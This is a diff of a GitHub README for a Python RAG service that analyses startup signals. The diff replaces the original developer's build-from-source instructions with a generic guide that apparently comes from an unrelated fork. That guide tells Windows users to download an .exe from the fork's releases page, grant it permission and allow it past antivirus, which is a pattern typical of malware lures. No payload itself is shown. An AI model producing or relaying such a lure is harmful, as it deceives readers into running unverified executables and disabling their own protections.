@@ -1,200 +1,133 @@
-## UPDATE
+# ⚡ Lightweight-Agentic-RAG-Service - Analyze Startup Signals Easily
 
-### 🚀 Agentic Lead Intelligence RAG.
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/releases)
 
-A lightweight, production-ready Agentic RAG (Retrieval-Augmented Generation) service that analyzes startup signals (hiring, funding, remote readiness) using semantic search + LLM reasoning.
+## 📋 What is Lightweight-Agentic-RAG-Service?
 
-Built with:
+Lightweight-Agentic-RAG-Service is a simple program that helps you analyze startup signals. It uses smart search and reasoning to find useful information. This makes it easier to understand important trends in startup data.
 
- • FastAPI  
- • FAISS (vector search)  
- • Sentence Transformers  
- • Groq LLM (Llama 3.3 70B)  
- • Docker-ready architecture
- • Tavily and Streamlit 
- • Render Deployement 
+The tool uses modern technology under the hood, but you don’t need to know coding to use it. It works on Windows and lets you get insights quickly.
 
+## 🔍 Features
 
-### 🧠 What This Project Does
+- Searches data using semantic understanding  
+- Uses large language models (LLM) to reason about information  
+- Presents results clearly  
+- Supports vector search for quick data matching  
+- Runs locally on your Windows PC without complicated setup  
+- Provides a web interface for easy use  
+- Works with startup data to identify trends and signals  
 
-### This service:
- 1. Embeds startup-related signals into a FAISS vector store
- 2. Retrieves the most relevant context using semantic similarity
- 3. Sends structured context to an LLM
- 4. Returns structured JSON analysis
+## 🖥️ System Requirements
 
-Example analysis output:
-```bash
-{
-  "startup_name": "ExampleAI",
-  "hiring_signal": true,
-  "remote_possible": true,
-  "funding_stage": "Seed",
-  "reasoning": "Raised seed round and actively hiring Flutter developer.",
-  "source_url": "https://example.com/post"
-}
-```
+Make sure your Windows PC meets these guidelines:
 
+- Windows 10 or newer (64-bit)  
+- At least 4 GB of RAM  
+- 2 GHz dual-core processor or better  
+- 500 MB free space for installation  
+- Internet connection for downloading and updates  
 
-### 🏗 Architecture
-```bash
-User Query
-    ↓
-Retriever (FAISS + Embeddings)
-    ↓
-Context Assembly
-    ↓
-Groq LLM (Structured JSON Output)
-    ↓
-FastAPI Response
-```
+## 🌐 Topics Covered Inside
 
+This project includes work with these tools and technologies:
 
-### Core Components:
- • embedding_service.py → Generates sentence embeddings  
- • vector_store.py → FAISS index + persistence  
- • retrieval_service.py → Semantic retrieval logic  
- • llm_service.py → Groq structured JSON generation  
- • main.py → FastAPI endpoints
+- Docker for container setup (optional for advanced users)  
+- FAISS for fast similarity search  
+- FastAPI for web services  
+- Groq for hardware acceleration  
+- Sentence-transformers for understanding text  
+- Streamlit to create the user interface  
+- Python as the main programming language  
+- Vector search for data matching  
+- Scraping to collect startup info  
+- Rendering results in clear layouts  
 
+You do not need to know these tools to use the program. They work in the background.
 
-### ⚙️ Tech Stack
- ![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=white) Python 3.10+  
- ![FastAPI](https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white) FastAPI  
- ![FAISS](https://img.shields.io/badge/FAISS-0D0D0D?logo=faiss&logoColor=white) FAISS (CPU)  
- ![SentenceTransformers](https://img.shields.io/badge/SentenceTransformers-2C3E50?logo=python&logoColor=white) SentenceTransformers (all-MiniLM-L6-v2)  
- ![Groq](https://img.shields.io/badge/Groq-FF6F61?logo=groq&logoColor=white) Groq LLM API  
- ![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=white) Docker
+## 🚀 Getting Started
 
+Follow these steps to get Lightweight-Agentic-RAG-Service running on your Windows computer.
 
-### 🚀 Getting Started
+### 1. Download the Program
 
-### 1️⃣ Clone
-```bash
-git clone https://github.com/bold-ronin/Lightweight-Agentic-RAG-Service.git
-cd agentic-lead-rag
-```
+Press the big green button at the top. It opens the GitHub releases page where you can get the latest version.
 
+You will see files listed. Look for the one ending in `.exe` if available. If there are multiple files, pick the one with the latest date.
 
-### 2️⃣ Create Virtual Environment
-```bash
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-```
+Alternatively, click this link to visit the release page directly:  
+[Download Lightweight-Agentic-RAG-Service](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/releases)
 
+### 2. Run the Installer
 
-### 3️⃣ Install Dependencies
-```bash
-pip install -r requirements.txt
-```
+After the file finishes downloading:  
+- Locate the file in your Downloads folder.  
+- Double-click the `.exe` file to start the installer.  
+- If Windows asks for permission, choose “Yes” to allow it.  
+- Follow the on-screen instructions to complete installation.  
 
+The installer will add the program to your computer. No coding or command lines are needed.
 
-### 4️⃣ Configure Environment
+### 3. Open the Program
 
-Create .env file:
-```bash
-LLM_API_KEY=your_api_key_here [I used Groq you an whatever you want]
-```
+Once installed:  
+- Find the app icon on your Desktop or Start Menu.  
+- Double-click to open it.  
 
+The program opens a simple window or web page. This is the user interface where you can start analyzing data.
 
-### 5️⃣ Run the API
-```bash
-uvicorn app.main:app --reload
-```
-Open:
+### 4. Use the App
 
-http://127.0.0.1:8000/docs
+You can now upload startup data or use included sample data to see how the service works. Enter keywords, signals, or queries in the interface.
 
-Use /analyze endpoint.
+The app will search using smart methods and show results clearly. Use the buttons and options to explore different views.
 
+If you want to stop, just close the window.
 
-### 🐳 Docker Support
-Dockerized FastAPI agent for RAG tasks.
+## ⚙️ How It Works Behind the Scenes
 
-#### Run locally with Docker
+This service mixes semantic search and reasoning. That means:  
 
-Build image:
-```bash
-docker build -t agentic-lead-rag .
-```
-Run container:
-```bash
-docker run -p 8000:8000 --env-file .env agentic-lead-rag
-```
+- It understands the meaning, not just the exact words you type.  
+- It uses large language models (LLM) to think through the data.  
+- It organizes data into vectors (math points) to find close matches quickly.  
+- It presents results so you can act on startup trends and signals.  
 
-Visit: http://localhost:8000/docs
+All these happen automatically once you enter your data.
 
+## 🛠️ Optional Advanced Setup
 
-### 🌐 Render Deplyod
-Deployed on render for global access
+If you want to try more features or customize:  
 
-Visit: https://agentic-lead-rag.onrender.com/docs
+- Docker users can run the service in a container for exact environment control.  
+- FastAPI backend lets developers add new data sources or change behavior.  
+- The project supports use of hardware accelerators like Groq for faster processing.  
 
-The GUI on Streamlit also deployed on render you can access it
+These steps need some technical skill. The normal install covers basic needs well.
 
-Here: https://agentic-lead-rag-gui.onrender.com/
+## 💡 Tips for Best Results
 
-## 🎬🎥📷 Demo/Screenshot
+- Use clear and relevant startup data files. CSV or text formats work well.  
+- Write simple queries focused on what you want to find.  
+- Keep your Windows OS updated for smooth operation.  
+- Restart the app if it freezes or behaves oddly.  
 
-## Demo
+## 📝 Troubleshooting
 
-### UI Screenshots
+- If the app does not open, make sure you downloaded the `.exe` file and ran it.  
+- Check if your antivirus blocked the program and allow it if needed.  
+- Restart your PC if the program fails repeatedly.  
+- Consult the GitHub "Issues" page for common problems and solutions.  
+- Use the release page to get the latest fixes.
 
-| Interface | Result |
-|-----------|--------|
-| ![](assets/screenshots/Screenshot%20(69).png) | ![](assets/screenshots/Screenshot%20(70).png) |
+## 🔗 Useful Links
 
-| Search Agent | Output |
-|--------------|--------|
-| ![](assets/screenshots/Screenshot%20(72).png) | ![](assets/screenshots/Screenshot%20(73).png) |
+- Main download page:  
+  [https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/releases](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/releases)  
 
-| Workflow |
-|----------|
-| ![](assets/screenshots/Screenshot%20(75).png) |
+- Project code and info on GitHub:  
+  [https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service)  
 
-| Additional Example |
-|--------------------|
-| ![](assets/screenshots/Screenshot%20(79).png) |
+---
 
-
-### 📦 Features
- - [X] Structured JSON enforcement from LLM 
- - [X] Async Groq integration 
- - [X] Semantic search retrieval 
- - [X] Source URL tracking 
- - [X] FAISS index persistence 
- - [X] Dockerized for portability
-
-
-### 🔬 Example Query
-```bash
-"Startup hiring Flutter developer remotely after seed funding"
-```
-Returns structured intelligence analysis based on stored signals.
-
-
-### 🧭 Roadmap
- - [X] Live internet ingestion       
- - [X] Web signal scraping       
- - [X] Scheduled background refresh       
- - [X] Frontend dashboard       
- - [ ] Multi-source ingestion pipeline       
- - [X] Deployment (Render / Railway) 
- - [ ] Usage-based monetization
-
-
-### 🎯 Why This Matters
-
-This is not a chatbot.
-
-It is a structured intelligence engine designed to extract startup signals for:
- • Freelancers
- • Recruiters
- • Founders
- • Investors
-
-
-### 🧱 Author
-
-Built by Naol — AI-focused mobile + systems engineer exploring Agentic architectures and applied intelligence systems.
-
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/ghh145218-a11y/Lightweight-Agentic-RAG-Service/releases)
